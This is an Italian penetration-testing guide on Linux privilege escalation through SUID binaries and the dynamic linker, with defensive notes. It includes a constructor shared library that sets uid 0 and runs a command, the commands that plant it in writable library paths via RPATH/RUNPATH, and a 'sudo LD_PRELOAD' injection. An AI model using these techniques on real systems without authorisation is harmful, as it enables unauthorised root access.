# Abuso di librerie condivise e linker SUID

{{#include ../../banners/hacktricks-training.md}}

I binari SUID vengono solitamente esaminati per individuare l'esecuzione diretta di comandi, ma anche i programmi SUID personalizzati possono essere vulnerabili tramite il dynamic linker. Il principio comune è semplice: un eseguibile con privilegi carica codice da un percorso o da una configurazione che un utente con privilegi inferiori può influenzare.<sup>[[1]](#references)</sup>

Questa pagina si concentra su schemi generici di tecniche: librerie mancanti, directory di librerie scrivibili, `RPATH`/`RUNPATH`, `LD_PRELOAD` tramite sudo, configurazione del linker e confusione con gli hard link SUID.

Per informazioni sugli header dei programmi ELF, sulla sezione dinamica e sul comportamento del loader alla base di questi controlli, consulta [Informazioni di base su ELF](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md).

## Enumerazione rapida

Inizia individuando i file SUID insoliti e verificando se sono collegati dinamicamente:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

Usa `readelf` per un eseguibile sconosciuto: [`ldd` potrebbe eseguire un interprete ELF non attendibile](https://man7.org/linux/man-pages/man1/ldd.1.html). `readelf` mostra le dipendenze dirette, quindi verifica separatamente il percorso effettivamente scelto dal loader.<sup>[[1]](#references)[[3]](#references)</sup>

Concentrati su percorsi non standard, percorsi di applicazioni personalizzati, binari di proprietà di root ma esterni alle directory gestite dai pacchetti e dipendenze caricate da directory scrivibili.<sup>[[1]](#references)</sup>

Controlli utili della scrivibilità:

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## Missing Shared Object Injection

Alcuni binari SUID personalizzati tentano di caricare un shared object inesistente. Se il percorso mancante si trova in una directory controllata dall’attaccante, il binario potrebbe caricare codice fornito dall’attaccante con i privilegi dell’utente effettivo.<sup>[[1]](#references)</sup>

Lo stesso principio vale per un **binario personalizzato consentito tramite sudo** che chiama `dlopen()` su un percorso `.so` assoluto all’interno di una home directory o di una directory di configurazione scrivibile dal chiamante. Questo caricamento tardivo della libreria potrebbe non comparire nell’output di `ldd` né nelle voci ELF `NEEDED`. Un’analisi limitata con `strings` o il tracciamento di un’esecuzione **non privilegiata** possono rivelare il percorso tentato; una password dell’applicazione o una scelta di menu potrebbero condizionare la ricerca. Verifica la regola sudo effettiva, il percorso esatto e i permessi della directory padre, e accertati che l’esecuzione privilegiata raggiunga quella ricerca prima di considerarla un’escalation. Non eseguire il target sudo solo per enumerarlo.

Trova i tentativi falliti di caricamento delle librerie con il filtro delle syscall di `strace`:<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

Se il binario cerca libexample.so in un percorso scrivibile, una libreria proof minimale può usare un constructor. Mantieni innocuo il proof-of-impact durante la convalida:<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

Compilala con il nome file esatto che il binario tenta di caricare:

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

La condizione sfruttabile non è la sola libreria mancante. L'attaccante deve poter posizionare un shared object compatibile in un percorso che il loader privilegiato accetterà.<sup>[[1]](#references)</sup>

## Directory delle librerie scrivibili

A volte tutte le dipendenze esistono, ma una delle directory usate per risolverle è scrivibile. Ciò può consentire di sostituire una libreria caricata o di inserire una libreria con lo stesso nome e priorità più alta.<sup>[[1]](#references)</sup>

La stessa verifica si applica a un ELF personalizzato **autorizzato tramite sudo**, anche quando l'ELF non ha il bit SUID e l'account RunAs autorizzato non è root. Confronta le voci `DT_NEEDED` con il percorso della libreria che il loader risolverà; poi verifica se il chiamante può scrivere in quel file o sostituirlo tramite una directory padre scrivibile e attraversabile. Verifica la regola sudo esatta per RunAs, i symlink e le ACL, la policy del loader e che il processo di destinazione carichi la libreria con l'account con privilegi più elevati. Un `.so` scrivibile o il solo nome di una dipendenza sono soltanto indizi; esamina i metadati senza eseguire il comando sudo.<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

Esamina i percorsi delle dipendenze:<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

Se la directory è scrivibile, convalida in un lab usando un approccio sicuro basato su copie. Sostituire librerie di sistema su un host attivo può lasciare processi che si avviano contemporaneamente con versioni delle librerie incoerenti.<sup>[[8]](#references)</sup>

### Librerie scrivibili all'interno di un chroot

Un chroot da solo non chiude i file descriptor ereditati né confina tutti gli accessi al filesystem. Se una sandbox lascia un file descriptor di directory che punta al di fuori della nuova root e il processo isolato può dereferenziare quel descriptor (ad esempio tramite una voce accessibile in `/proc/<pid>/fd/`), i percorsi dell'host potrebbero rimanere raggiungibili. Si tratta di un problema relativo ai confini del filesystem; di per sé non concede privilegi root.<sup>[[11]](#references)[[12]](#references)</sup>

Verifica separatamente se l'utente isolato può scrivere in una directory di librerie che verrà usata da un **eseguibile host con SUID root** quando viene avviato dal jail. Il loader risolve le dipendenze nella vista del filesystem del processo, quindi una libreria controllata dall'attaccante in quella directory potrebbe essere eseguita con l'identità effettiva del programma SUID. Verifica l'eseguibile esatto, il suo bit SUID e le policy di mount, la destinazione del descriptor e i permessi di accesso, il percorso di ricerca delle librerie del jail e che il programma possa effettivamente raggiungere l'eseguibile dell'host. Una file capability sul launcher della sandbox, un jail scrivibile o un binario SUID dell'host, da soli, sono solo indizi; la catena completa dipende dall'implementazione della sandbox.<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH e RUNPATH

`RPATH` e `RUNPATH` sono voci della sezione dinamica che indicano al loader dove cercare le librerie. Sono pericolose nei programmi SUID quando puntano a directory scrivibili dall'attaccante.<sup>[[1]](#references)</sup>

Rilevale:<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

Esempio di output rischioso:

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

Se `/opt/app/lib` è scrivibile e il binario necessita di `libcustom.so`, l'attaccante potrebbe riuscire a inserire lì un `libcustom.so` malevolo:<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` e `RUNPATH` non sono identici in tutti i dettagli di risoluzione, ma per l’analisi dell’escalation dei privilegi la domanda pratica è la stessa: il binario SUID cerca una libreria in una directory scrivibile dall’attaccante con quel nome?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH e SUID

Per i programmi normali, `LD_PRELOAD` e `LD_LIBRARY_PATH` possono forzare o influenzare il caricamento degli oggetti condivisi. Per i programmi SUID, il dynamic loader entra normalmente in modalità di esecuzione sicura e ignora le variabili d’ambiente pericolose.<sup>[[1]](#references)</sup>

Questo significa che un semplice binario SUID di solito non è vulnerabile solo perché l’utente può impostare `LD_PRELOAD`:<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

L'eccezione comune è una policy sudo che consente di assegnare una variabile d'ambiente sulla riga di comando per il target, ad esempio tramite un tag `SETENV` o l'opzione `setenv` applicabile. Se il target è collegato dinamicamente e sudo accetta `LD_PRELOAD=/path/to/library`, il target potrebbe caricare codice controllato dal chiamante. Verifica la regola effettiva e l'identità del target. Aggiungere semplicemente `LD_PRELOAD` a `env_keep` non è sufficiente sui sistemi in cui il dynamic loader rimuove un `LD_PRELOAD` ereditato prima che si avvii il processo SUID `sudo`; un'assegnazione sulla riga di comando viene valutata da sudo dopo il proprio avvio.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

Non confondere questi casi; il loader e le regole delle policy sudo riportate sopra li distinguono:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` contro un normale binario SUID: di solito viene bloccato in modalità secure execution.
- `LD_PRELOAD` accettato come assegnazione da riga di comando di sudo per un target privilegiato e collegato dinamicamente: potenzialmente sfruttabile.
- `.so` mancante in un percorso scrivibile: sfruttabile quando il binario SUID carica naturalmente quel percorso.
- `RPATH`/`RUNPATH` verso una directory scrivibile: sfruttabile quando è possibile controllare una libreria necessaria.
- Accesso in scrittura a `/etc/ld.so.preload` o alla configurazione del linker: impatto esteso a tutto il sistema e elevato.

## Configurazione del linker

`ld.so` usa la cache del linker e `/etc/ld.so.preload`; `ldconfig` crea la cache a partire da `/etc/ld.so.conf` e dai file inclusi, comunemente in `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Controlli ad alto valore:

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

Una configurazione del linker scrivibile è solitamente più grave di un singolo binario SUID vulnerabile, perché può influire su molti processi collegati dinamicamente. `/etc/ld.so.preload` è particolarmente pericoloso perché può forzare il caricamento di un oggetto condiviso nei processi privilegiati.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## Confusione degli hardlink SUID

Gli hardlink possono far apparire lo stesso inode SUID con più nomi.<sup>[[9]](#references)</sup> Questo è utile per nascondere un helper privilegiato, confondere le operazioni di pulizia o aggirare revisioni ingenue basate sui percorsi.

Trova i file SUID con più di un link:<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

Esamina tutti i percorsi allo stesso inode:<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

L'abuso non consiste nel fatto che un hardlink modifichi i permessi. L'abuso è la confusione dei percorsi: un inode privilegiato potrebbe essere raggiungibile tramite un nome che i difensori o gli script non si aspettano.<sup>[[9]](#references)</sup> Per approfondire gli inode e il workflow degli hardlink, consulta [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Note difensive

- Mantieni i binari SUID al minimo, sottoposti ad audit e, ove possibile, gestiti tramite pacchetti.
- Evita voci `RPATH`/`RUNPATH` che puntano a directory scrivibili o gestite dalle applicazioni.<sup>[[1]](#references)[[8]](#references)</sup>
- Mantieni le directory delle librerie di proprietà di root e non scrivibili dagli utenti normali.<sup>[[8]](#references)</sup>
- Non mantenere `LD_PRELOAD`, `LD_LIBRARY_PATH` o variabili simili del loader tramite sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Monitora `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` e i file SUID inattesi.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Esamina i file SUID con hardlink e indaga sui wrapper SUID personalizzati al di fuori dei percorsi di sistema standard.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — pagina del manuale Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — pagina del manuale Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — pagina del manuale Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Attributi comuni (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — pagina del manuale Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Hardening del linker dinamico (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard link (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — pagina del manual Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — pagina del manual Linux](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
